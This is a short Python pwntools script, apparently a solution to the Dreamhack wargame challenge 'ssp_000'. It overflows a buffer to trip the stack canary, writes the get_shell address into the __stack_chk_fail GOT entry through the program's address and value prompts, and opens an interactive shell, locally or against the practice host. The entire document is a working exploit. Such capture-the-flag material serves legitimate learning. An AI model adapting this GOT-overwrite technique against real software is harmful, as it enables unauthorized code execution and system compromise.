from pwn import *
import sys

context.log_level="debug"

if len(sys.argv)!=2:
    log.info("try 'python ex.py -l' for local")
    log.info("try 'python ex.py -r' for remote")
    exit(0)

if sys.argv[1]=="-r":
    p = remote('host1.dreamhack.games',16707)
elif sys.argv[1]=="-l":
    p = process('ssp_000')
else:
    log.info("options: -l for local, -r for remote")
    exit(0)

e=ELF('./ssp_000')

# Adresses
get_shell=e.symbols['get_shell']
bss=e.bss()
stack_chk_fail_got=e.got['__stack_chk_fail']

log.info("get_shell address: {}".format(hex(get_shell)))
log.info("stack_chk_fail address: {}".format(hex(stack_chk_fail_got)))


payload=""
payload+="A"*0x50

p.send(payload)
p.sendlineafter("Addr : ",str(stack_chk_fail_got))
p.sendlineafter("Value : ",str(get_shell))
p.interactive()
